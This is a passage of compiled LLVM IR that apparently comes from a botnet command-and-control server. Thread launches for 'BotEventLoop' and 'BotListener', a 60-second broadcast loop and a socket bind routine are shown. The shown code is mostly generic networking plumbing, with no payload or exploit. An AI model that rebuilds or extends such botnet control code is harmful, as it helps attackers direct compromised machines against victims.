  %73 = alloca i64, i64 %71, align 16
  store i64 %71, i64* %13, align 8
  br label %74

74:                                               ; preds = %78, %68
  %75 = load i32, i32* %9, align 4
  %76 = add nsw i32 %75, -1
  store i32 %76, i32* %9, align 4
  %77 = icmp ne i32 %75, 0
  br i1 %77, label %78, label %84

78:                                               ; preds = %74
  %79 = load i32, i32* %9, align 4
  %80 = add nsw i32 %79, 1
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i64, i64* %73, i64 %81
  %83 = call i32 @pthread_create(i64* %82, %union.pthread_attr_t* null, i8* (i8*)* @BotEventLoop, i8* null) #9
  br label %74, !llvm.loop !20

84:                                               ; preds = %74
  %85 = getelementptr inbounds i64, i64* %73, i64 0
  %86 = load i32, i32* %10, align 4
  %87 = sext i32 %86 to i64
  %88 = inttoptr i64 %87 to i8*
  %89 = call i32 @pthread_create(i64* %85, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @BotListener to i8* (i8*)*), i8* %88) #9
  br label %90

90:                                               ; preds = %91, %84
  br label %91

91:                                               ; preds = %90
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.86, i64 0, i64 0))
  %92 = call i32 @sleep(i32 60)
  br label %90
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #9
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.88, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #9
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #9
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.89, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #9
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !21

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.90, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #9
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind readonly willreturn }
attributes #9 = { nounwind }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
